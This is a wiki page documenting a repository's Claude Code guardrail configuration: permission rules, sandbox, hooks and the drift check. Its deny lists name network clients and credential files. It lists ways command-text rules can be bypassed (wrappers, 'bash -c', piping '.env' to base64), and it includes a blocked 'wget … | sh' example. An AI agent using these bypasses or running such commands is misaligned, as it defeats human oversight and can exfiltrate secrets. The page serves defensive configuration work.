`.claude/settings.json` is the shared Claude Code configuration for this repository. It sets the permission mode, the allow / ask / deny rules, the OS sandbox, the four guardrail hooks and the approved MCP servers. This page explains every key and every rule in it, and what happens if you change one.

## At a glance

| | |
|---|---|
| **File** | [`.claude/settings.json`](https://github.com/pixelofsoftware/AI-Mods/blob/main/.claude/settings.json) (committed, shared by everyone who clones the repo) |
| **Who edits it** | AppSec / code owners, through a reviewed pull request ([`.github/CODEOWNERS`](https://github.com/pixelofsoftware/AI-Mods/blob/main/.github/CODEOWNERS)) |
| **Enforced by** | Claude Code at runtime; `validate-claude-config` in pre-commit and CI checks it against [`config/claude-guardrails-policy.json`](https://github.com/pixelofsoftware/AI-Mods/blob/main/config/claude-guardrails-policy.json) |
| **Can developers override it?** | Partly. A developer can add rules in their own `.claude/settings.local.json`, but can't override a `deny` from this file or from [managed settings](Settings-Organisation-Policy) |
| **Rule counts** | ✅ 35 allow · ✋ 48 ask · ⛔ 62 deny |

Legend used on this page: ⛔ Deny/Block · ✋ Ask · ⚠️ Warn · ✅ Allow. "Drift check" means `python3 scripts/precommit/check_ai_guardrails.py validate-config` (see [Policy baseline](Settings-Policy-Baseline)).

## Top-level keys

| Key | Value here | What it does | Why | Drift check fails if loosened? |
|---|---|---|---|---|
| `$schema` | `https://json.schemastore.org/claude-code-settings.json` | Lets editors validate and autocomplete the file | Catches typos before Claude Code silently ignores a key | No (cosmetic) |
| `permissions` | object | Mode, bypass lock, read scope and the allow / ask / deny lists | The core least-privilege control | Partly, see below |
| `enableAllProjectMcpServers` | `false` | Doesn't auto-approve every server in `.mcp.json` | Each server must be named in `enabledMcpjsonServers` | **Yes**, must be `false` |
| `enabledMcpjsonServers` | `["internal-docs", "internal-tickets"]` | The `.mcp.json` servers this project approves | A new server in `.mcp.json` needs a reviewed change here too | **Yes**: every server must be in both files ([MCP servers](Settings-MCP-Servers)) |
| `sandbox` | object | OS-level sandbox for Bash: network and filesystem limits | Contains code that allowlisted commands run, such as tests Claude wrote | Partly, see below |
| `hooks` | object | Wires the four guardrail scripts | The hooks parse what permission rules can't | **Yes** |
| `cleanupPeriodDays` | `14` | Local session transcripts older than 14 days are deleted ([policy §5](https://github.com/pixelofsoftware/AI-Mods/blob/main/docs/claude-guardrails.md#5-logging-and-monitoring)) | Data minimisation on the workstation | No. Managed settings set the same value org-wide |

Keys that are **not** here on purpose:

- `apiKeyHelper`, `awsAuthRefresh`, `awsCredentialExport`, `otelHeadersHelper`, `statusLine` and `disableAllHooks`. The drift check fails if any of them appears. See [Policy baseline](Settings-Policy-Baseline#forbidden_settings_keys).
- `env`. The project sets no environment variables. An `env` block is allowed, but the drift check fails on names that match the forbidden patterns (for example `ANTHROPIC_*`, `*_BASE_URL` or a proxy), and `OTEL_*` names are ignored by Claude Code here ([Organisation policy](Settings-Organisation-Policy)).

## `permissions` keys

| Key | Value here | What it does | Why | Drift check fails if loosened? |
|---|---|---|---|---|
| `defaultMode` | `"default"` | Sessions start in Manual mode: Claude asks before edits and before commands that aren't allowlisted | The repository default in [policy §1](https://github.com/pixelofsoftware/AI-Mods/blob/main/docs/claude-guardrails.md#1-execution-controls). Developers can still switch modes with `Shift+Tab` | **Yes** for `bypassPermissions`, `auto` and `acceptEdits` (listed in `forbidden_default_modes`). Other values aren't checked |
| `disableBypassPermissionsMode` | `"disable"` | Turns off bypass-permissions mode | Bypass skips every prompt, so the ask rules would mean nothing | **Yes**, must be `"disable"` |
| `blockReadsOutsideWorkingDirectories` | `true` | Blocks reads of files outside the project | Keeps Claude out of home-directory configs and other repos. Needs a recent Claude Code release; older versions skip the key with a warning ([setup guide A1](https://github.com/pixelofsoftware/AI-Mods/blob/main/docs/claude-guardrails-setup.md#a1-prerequisites)) | **No**. Removing it passes the drift check, so code-owner review is the control |
| `allow` | 35 rules | ✅ Runs without a prompt | Routine work flows without friction | Partly: wildcard and dangerous allows are rejected |
| `ask` | 48 rules | ✋ Asks a human every time, in every mode | Risky but legitimate actions | Partly: 4 required rules |
| `deny` | 62 rules | ⛔ Never runs | Secrets, network clients, destructive actions | Partly: 13 required rules |

## How permission rules work

### Rule syntax

| Form | Example from this file | Matches |
|---|---|---|
| Tool name only | `WebSearch`, `WebFetch` | Every use of that tool |
| `Bash(<command>)` | `Bash(git status)` | That exact command |
| `Bash(<prefix> *)` | `Bash(git log *)` | The command followed by arguments |
| `Read(<path pattern>)` / `Edit(<path pattern>)` | `Read(**/.env)`, `Edit(**/*.tf)` | File paths, gitignore-style. `**/` means any directory depth |
| `Edit(/<path>)` | `Edit(/.claude/**)` | A path anchored at the project root |
| `Read(~/<path>)` | `Read(~/.ssh/**)` | A path in your home directory |
| `mcp__<server>__*` | `mcp__internal-docs__*` | Every tool of one MCP server |

Claude Code applies `Read(...)` rules to its file-reading tools and `Edit(...)` rules to its file-editing tools. The exact matching rules (word boundaries, path anchors, which tools each rule covers) are defined by Claude Code, not by this repository. See the [Claude Code settings documentation](https://code.claude.com/docs/en/settings).

### Precedence: deny, then ask, then allow

Claude Code checks **deny first, then ask, then allow**. The first match decides:

- `Bash(docker *)` is ✋ ask, but `Bash(docker push *)` is ⛔ deny, so `docker push …` is denied.
- `Bash(kubectl *)` is ✋ ask, but `Bash(kubectl delete *)` is ⛔ deny.
- `Bash(git push *)` is ✋ ask, but `Bash(git push --force *)` is ⛔ deny.

Rules from every settings source are combined. A `deny` in [managed settings](Settings-Organisation-Policy) or in this file can't be cancelled by an `allow` in a developer's local file. For the full order of settings sources, see the [Claude Code settings documentation](https://code.claude.com/docs/en/settings).

### Workspace trust

When you first start `claude` in the folder, accept the **workspace trust** prompt. From the [setup guide, A4](https://github.com/pixelofsoftware/AI-Mods/blob/main/docs/claude-guardrails-setup.md#a4-start-claude-code-and-verify):

- **Deny rules apply immediately**, trusted or not.
- **Allow rules, `env` and MCP servers apply only after you trust the folder.**

So an untrusted clone is stricter, not looser. Run `/permissions` to see the effective lists and `/status` to see which settings sources loaded.

## ✅ Allow rules (35)

These run without a prompt. Every one is read-only, a test or lint run, or a local check. Tests and builds execute code, so the [sandbox](#sandbox) is what contains them.

| Group | Rules | Why |
|---|---|---|
| Read-only git (10) | `Bash(git status)`, `Bash(git status *)`, `Bash(git diff)`, `Bash(git diff *)`, `Bash(git log *)`, `Bash(git show *)`, `Bash(git branch)`, `Bash(git branch --show-current)`, `Bash(git blame *)`, `Bash(git rev-parse *)` | Reading history never changes anything. `bash_guard` still denies `git … --output=<file>`, which would turn these into file writes |
| JavaScript / TypeScript (9) | `Bash(npm run test)`, `Bash(npm run test *)`, `Bash(npm test)`, `Bash(npm test *)`, `Bash(npm run lint)`, `Bash(npm run lint *)`, `Bash(npm run typecheck)`, `Bash(npm run build)`, `Bash(npx tsc --noEmit)` | The test, lint and build loop. Note that `npx *` in general is ✋ ask; only the type check is allowed |
| Python (7) | `Bash(pytest)`, `Bash(pytest *)`, `Bash(python -m pytest *)`, `Bash(python3 -m pytest *)`, `Bash(ruff check *)`, `Bash(ruff format --check *)`, `Bash(mypy *)` | Tests, lint and type checks. `ruff format` is allowed only in `--check` mode, so it never rewrites files |
| Go (2) | `Bash(go test ./...)`, `Bash(go vet ./...)` | Tests and static checks for the whole module |
| Pre-commit (2) | `Bash(pre-commit run)`, `Bash(pre-commit run --all-files)` | Lets Claude run the same gates you do ([Pre-commit](Settings-Pre-Commit)) |
| Terraform, read-only (2) | `Bash(terraform fmt -check *)`, `Bash(terraform validate)` | Format and syntax checks that don't touch state or the cloud. `plan` and `init` are ✋ ask |
| Safeguard scanner (2) | `Bash(python3 scripts/claude_safeguard.py scan *)`, `Bash(python3 scripts/claude_safeguard.py check-output *)` | Offline redaction dry-run and output validation, no API call ([API safeguard](Guardrail-API-Safeguard)) |
| MCP (1) | `mcp__internal-docs__*` | The read-only internal docs server ([MCP servers](Settings-MCP-Servers)) |

**Drift check:** it rejects any allow rule that matches `forbidden_allow_rule_patterns`: a bare `Bash`, `Bash(*…)`, rules containing `*:*`, any `WebFetch` or `WebSearch`, `mcp__*`, network clients, `sudo`/`su`/`env`/`printenv`, `git push`, `terraform`/`tofu` `apply`/`destroy`, `kubectl delete`/`apply`, `Read(//…)` and `Read(~…)`. It also rejects `mcp__<server>__…` allows for a server that isn't in `enabledMcpjsonServers`.

> [!WARNING]
> The drift check does **not** catch every broad allow. In a test on a scratch copy, `Bash(python3 *)`, `Bash(bash *)`, `Edit(**)` and `Read(/etc/**)` all passed. Code-owner review is the control for those. Treat any new allow rule that can run arbitrary code as a security change.

## ✋ Ask rules (48)

A human approves each one, even in accept-edits or auto mode.

| Group | Rules | Why |
|---|---|---|
| Web (1) | `WebFetch` | Fetched pages can carry prompt injection. Approve only docs you'd open yourself ([policy §4.2](https://github.com/pixelofsoftware/AI-Mods/blob/main/docs/claude-guardrails.md#42-web-access)) |
| Git that changes shared state (3) | `Bash(git push *)`, `Bash(git reset *)`, `Bash(git rebase *)` | Pushes leave your machine; reset and rebase can lose work |
| Dependency installs (8) | `Bash(npm install *)`, `Bash(npm ci *)`, `Bash(npx *)`, `Bash(pip install *)`, `Bash(pip3 install *)`, `Bash(uv add *)`, `Bash(poetry add *)`, `Bash(go get *)` | Installs run third-party code and change the supply chain. `npx` downloads and runs a package |
| Terraform, non-mutating but networked (2) | `Bash(terraform plan *)`, `Bash(terraform init *)` | They reach providers and state backends. `apply` and `destroy` are ⛔ deny |
| Containers and clusters (3) | `Bash(docker *)`, `Bash(kubectl *)`, `Bash(helm *)` | Can change running systems. The destructive subcommands are ⛔ deny |
| Cloud and GitHub CLIs (4) | `Bash(aws *)`, `Bash(gcloud *)`, `Bash(az *)`, `Bash(gh *)` | Act with your cloud or GitHub identity |
| File operations (2) | `Bash(rm *)`, `Bash(chmod *)` | Deletion and permission changes |
| MCP (1) | `mcp__internal-tickets__*` | The ticket server can write, so every call needs approval |
| Infrastructure-as-code edits (7) | `Edit(**/*.tf)`, `Edit(**/*.tfvars)`, `Edit(**/*.hcl)`, `Edit(**/Dockerfile*)`, `Edit(**/.github/workflows/**)`, `Edit(**/k8s/**)`, `Edit(**/helm/**)` | Tier 2: human in the loop ([policy §3](https://github.com/pixelofsoftware/AI-Mods/blob/main/docs/claude-guardrails.md#3-code-review-human-in-the-loop-hitl)) |
| Security-critical code edits (3) | `Edit(**/auth/**)`, `Edit(**/security/**)`, `Edit(**/crypto/**)` | Tier 2: auth and crypto mistakes are security bugs |
| Guardrail edits (14) | `Edit(/.claude/**)`, `Edit(/.mcp.json)`, `Edit(/CLAUDE.md)`, `Edit(/.pre-commit-config.yaml)`, `Edit(/.github/CODEOWNERS)`, `Edit(/scripts/claude_safeguard.py)`, `Edit(/scripts/precommit/**)`, `Edit(/config/claude-guardrails-policy.json)`, `Edit(/enterprise/**)`, `Edit(/docs/claude-guardrails.md)`, `Edit(/docs/claude-guardrails-setup.md)`, `Edit(/scripts/setup_guardrails.sh)`, `Edit(/pyproject.toml)`, `Edit(/.gitignore)` | An agent must never quietly weaken its own guardrails |

**Drift check:** `WebFetch`, `Bash(git push *)`, `Edit(**/*.tf)` and `Edit(/.claude/**)` are required. Each must be in `ask` or in `deny` (moving one to deny is allowed, because that's stricter). Removing any other ask rule passes the drift check.

`file_guard` asks for the same path groups with wider patterns (for example `*.bicep`, `compose.yaml`, `oauth*/`), so a path the `Edit` rules miss usually still gets a prompt. See [File guard](Guardrail-File-Guard).

## ⛔ Deny rules (62)

| Group | Rules | Why |
|---|---|---|
| Web search (1) | `WebSearch` | Disabled outright ([policy §4.2](https://github.com/pixelofsoftware/AI-Mods/blob/main/docs/claude-guardrails.md#42-web-access)) |
| Network clients (11) | `Bash(curl *)`, `Bash(wget *)`, `Bash(nc *)`, `Bash(ncat *)`, `Bash(netcat *)`, `Bash(telnet *)`, `Bash(socat *)`, `Bash(ssh *)`, `Bash(scp *)`, `Bash(sftp *)`, `Bash(ftp *)` | One injected `curl` can exfiltrate data. If something must be fetched, a human does it |
| Privilege escalation (2) | `Bash(sudo *)`, `Bash(su *)` | The agent never runs as root |
| Environment dumps (3) | `Bash(printenv)`, `Bash(printenv *)`, `Bash(env)` | Environment variables often hold tokens |
| Git safety (4) | `Bash(git push --force *)`, `Bash(git push -f *)`, `Bash(git commit --no-verify *)`, `Bash(git push --no-verify *)` | No rewriting shared history, no skipping the commit gates |
| Infrastructure changes (5) | `Bash(terraform apply)`, `Bash(terraform apply *)`, `Bash(terraform destroy)`, `Bash(terraform destroy *)`, `Bash(kubectl delete *)` | Infrastructure changes go through the reviewed CI pipeline |
| Publishing (3) | `Bash(npm publish *)`, `Bash(docker push *)`, `Bash(twine upload *)` | Releases are a human decision |
| Secret files in the project (18) | `Read(./.env)`, `Read(**/.env)`, `Read(**/.env.local)`, `Read(**/.env.development)`, `Read(**/.env.staging)`, `Read(**/.env.production)`, `Read(**/.env.test)`, `Read(**/.env.*.local)`, `Read(**/*.pem)`, `Read(**/*.key)`, `Read(**/*.p12)`, `Read(**/*.pfx)`, `Read(**/id_rsa*)`, `Read(**/id_ed25519*)`, `Read(**/*.tfstate)`, `Read(**/*.tfstate.backup)`, `Read(**/secrets/**)`, `Read(**/credentials.json)` | Secrets never enter the model's context. `.env.example` isn't listed, so templates stay readable |
| Credential files in your home directory (10) | `Read(~/.ssh/**)`, `Read(~/.aws/**)`, `Read(~/.azure/**)`, `Read(~/.config/gcloud/**)`, `Read(~/.kube/**)`, `Read(~/.docker/config.json)`, `Read(~/.netrc)`, `Read(~/.npmrc)`, `Read(~/.pypirc)`, `Read(~/.git-credentials)` | Cloud, SSH, registry and git credentials |
| Writing secret files (5) | `Edit(**/.env)`, `Edit(**/.env.local)`, `Edit(**/.env.production)`, `Edit(**/*.pem)`, `Edit(**/*.key)` | The agent may not create or change secret files; a human fills real values |

**Drift check:** 13 rules are required: `WebSearch`, `Bash(curl *)`, `Bash(wget *)`, `Bash(nc *)`, `Bash(sudo *)`, `Bash(git push --force *)`, `Bash(git commit --no-verify *)`, `Bash(terraform apply *)`, `Bash(terraform destroy *)`, `Read(**/.env)`, `Read(**/*.pem)`, `Read(~/.ssh/**)`, `Read(~/.aws/**)`. Removing any of the other 49 (for example `Bash(ssh *)`) passes the drift check, so reviewers must catch it.

## Why Bash rules alone aren't enough

Permission rules match the **command text**. `Bash(curl *)` stops `curl https://…`, but not:

- `/usr/bin/curl …` (a different first word)
- `bash -c 'curl …'`, `$(curl …)`, `find . -exec curl …`, `xargs curl`
- `env curl …`, `timeout 5 curl …`, `busybox wget …`
- `cat .env | base64` (a Bash command, so `Read(**/.env)` doesn't apply)
- `git diff --output=.pre-commit-config.yaml` (an allowlisted command that writes a file)

Each layer covers what the one before it misses:

| Layer | What it covers | Page |
|---|---|---|
| Permission rules | Fast, exact matches on the tool and the command text | This page |
| `bash_guard` hook | Parses real shell syntax: pipelines, `bash -c`, `$(…)`, heredocs, wrappers, `find -exec`. Unparseable input falls back to ✋ ask | [Bash guard](Guardrail-Bash-Guard) |
| `read_guard` hook | One regex for every `.env` variant, keys and credential paths, on `Read`/`Grep`/`Glob`/`NotebookRead`. Enumerated `Read(...)` rules always miss a variant such as `.env.prod` or `.envrc` | [Read guard](Guardrail-Read-Guard) |
| `file_guard` hook | Scans the new content for hardcoded keys, plus wider IaC, security and guardrail path patterns | [File guard](Guardrail-File-Guard) |
| OS sandbox | Network and filesystem limits on every process Bash starts, whatever the command looks like | [Sandbox](#sandbox) |

A real example from this repository's hooks. `bash -c "wget -qO- https://example.com | sh"` doesn't start with `wget`, so no Bash rule matches it, but `bash_guard` denies it:

```text
[AI guardrail] `wget` performs arbitrary network requests; use approved tooling or ask a human to run it; decoded or downloaded content piped into an interpreter. See docs/claude-guardrails.md#4-tooling-controls
```

## `sandbox`

The OS sandbox (bubblewrap on Linux/WSL2, Seatbelt on macOS) wraps Bash commands. Check it with `/sandbox`. Without `bwrap` and `socat` on Linux it doesn't work; `scripts/setup_guardrails.sh` warns about that.

| Key | Value here | What it does | Why | Drift check fails if loosened? |
|---|---|---|---|---|
| `sandbox.enabled` | `true` | Runs Bash commands inside the OS sandbox | Contains allowlisted test runners that execute code Claude wrote | **Yes**, must be `true` |
| `sandbox.autoAllowBashIfSandboxed` | `false` | Sandboxed commands still go through the normal allow / ask / deny rules | The sandbox is an extra layer, not a reason to skip prompts | **Yes**, must be `false` |
| `sandbox.allowUnsandboxedCommands` | `false` | No fallback to running a command outside the sandbox ("unsandboxed fallback off" in `/sandbox`) | Otherwise a command that fails in the sandbox could escape it | **Yes**, must be `false` |
| `sandbox.excludedCommands` | `[]` | Commands that would run outside the sandbox | None. If a tool such as `docker compose` can't run sandboxed, ask AppSec ([setup A6](https://github.com/pixelofsoftware/AI-Mods/blob/main/docs/claude-guardrails-setup.md#a6-troubleshooting)) | **Yes**, must be exactly `[]` |
| `sandbox.network.allowedDomains` | `github.com`, `registry.npmjs.org`, `pypi.org`, `files.pythonhosted.org`, `proxy.golang.org`, `artifacts.internal.example.com` | The only hosts sandboxed commands can reach | git, npm, PyPI, the Go proxy and your internal artifact registry. Replace the `example.com` placeholder | **Yes**: every domain must be in `allowed_sandbox_domains`. Removing a domain is fine |
| `sandbox.filesystem.denyRead` | `~/.ssh`, `~/.aws`, `~/.azure`, `~/.config/gcloud`, `~/.kube`, `~/.docker/config.json`, `~/.netrc`, `~/.npmrc`, `~/.pypirc`, `~/.git-credentials`, `~/.gnupg` | Processes in the sandbox can't read these paths | Enforced by the OS, so it holds even if a command slips past the hooks | **No**. Removing entries passes the drift check |

Managed settings add `allowManagedDomainsOnly`, so a project can't widen the domain list on managed machines. See [Organisation policy](Settings-Organisation-Policy#sandbox).

## `hooks`

| Event | `matcher` | Script | `timeout` (s) | Required by the drift check |
|---|---|---|---|---|
| `UserPromptSubmit` | none | `prompt_guard.py` | 15 | Yes |
| `PreToolUse` | `Bash\|Monitor` | `bash_guard.py` | 15 | Yes, the matcher must cover `Bash` |
| `PreToolUse` | `Write\|Edit\|MultiEdit\|NotebookEdit` | `file_guard.py` | 15 | Yes, the matcher must cover `Write` and `Edit` |
| `PreToolUse` | `Read\|Grep\|Glob\|NotebookRead` | `read_guard.py` | 15 | Yes, the matcher must cover `Read`, `Grep` and `Glob` |

Every handler has `"type": "command"` and the command `python3 "${CLAUDE_PROJECT_DIR}/.claude/hooks/<script>.py"`. Claude Code sets `CLAUDE_PROJECT_DIR` to the project root, so the hooks work from any subdirectory.

The drift check is strict about hooks:

- Every hook command must match that exact shape, and the script must be one of the four in `allowed_hook_scripts`. A hook such as `python3 /tmp/my_hook.py` fails with `PreToolUse hook … is not an approved guardrail script`.
- Each required script must be wired on its event with a matcher that covers its tools. The matcher is treated as a regular expression and must fully match the tool name. Narrowing `Bash|Monitor` to `Monitor` fails.
- The check doesn't require `MultiEdit`, `NotebookEdit`, `NotebookRead` or `Monitor` in the matchers, so dropping those passes. Review matcher changes carefully.

How the hooks behave on errors:

| Hook | On an internal error or a broken install |
|---|---|
| `bash_guard`, `file_guard`, `read_guard` | Fail closed: return ✋ ask with "manual review required" |
| `prompt_guard` | Fails open, so a hook bug never loses your prompt. It shows a `systemMessage` instead: `prompt_guard error: <type>`, or on a broken install a warning that prompts are **not** being checked |

The hooks also cap how much they analyse, so a huge payload can't push a hook past its timeout (the code comments note that a timed-out hook would fail open). `bash_guard` asks for commands over 100,000 characters, `file_guard` asks for new content over 500,000 characters, and `prompt_guard` scans only the head and tail of a prompt over 500,000 characters.

## `settings.local.json`: what developers can and can't change

`.claude/settings.local.json` is your personal settings file for this repo.

- It's listed in [`.gitignore`](https://github.com/pixelofsoftware/AI-Mods/blob/main/.gitignore) and in the policy's `forbidden_paths`, so `forbid-ai-artifacts` blocks committing it ([Pre-commit](Settings-Pre-Commit)).
- The drift check reads only `.claude/settings.json` and `.mcp.json`. It never sees your local file.

| You can | You can't |
|---|---|
| Add `allow` rules for commands you trust and run often (for example your stack's test command) | Override a `deny` from this file or from managed settings |
| Keep personal preferences out of the shared file | Re-enable bypass mode when managed settings disable it ([setup guide B2](https://github.com/pixelofsoftware/AI-Mods/blob/main/docs/claude-guardrails-setup.md#b2-deploy-managed-settings)) |
| | Commit the file: pre-commit and CI block it |

The setup guide states these limits ([A5](https://github.com/pixelofsoftware/AI-Mods/blob/main/docs/claude-guardrails-setup.md#a5-day-to-day-use) and B2). How Claude Code merges other keys from a local file (for example hooks or sandbox settings) is product behaviour; see the [Claude Code settings documentation](https://code.claude.com/docs/en/settings). If your organisation must stop developers from changing hooks or permission rules locally, use the managed options in [setup guide B5](https://github.com/pixelofsoftware/AI-Mods/blob/main/docs/claude-guardrails-setup.md#b5-optional-hardening) (`allowManagedHooksOnly`, `allowManagedPermissionRulesOnly`).

If a shared rule gets in your way, don't work around it locally. Open an `ai-guardrails` issue ([False positives and exceptions](Use-Case-False-Positives-and-Exceptions)).

## Changing this file

1. Edit `.claude/settings.json`. Claude asks before it touches the file (`Edit(/.claude/**)` and `file_guard`).
2. If the change loosens a control the policy checks, update [`config/claude-guardrails-policy.json`](https://github.com/pixelofsoftware/AI-Mods/blob/main/config/claude-guardrails-policy.json) in the same commit.
3. Run `python3 scripts/precommit/check_ai_guardrails.py validate-config`, `python3 -m pytest` and `pre-commit run --all-files`.
4. Explain in the PR what the change allows and whether it loosens anything. Code owners must approve.

For adapting the allowlist to another stack (for example `Bash(./gradlew test)`), see [Adopting in another repository](Use-Case-Adopting-in-Another-Repository).

## Related pages

- [Policy baseline](Settings-Policy-Baseline)
- [Organisation policy](Settings-Organisation-Policy)
- [MCP servers](Settings-MCP-Servers)
- [Bash guard](Guardrail-Bash-Guard)
- [Read guard](Guardrail-Read-Guard)
- [Changing the guardrails](Use-Case-Changing-the-Guardrails)
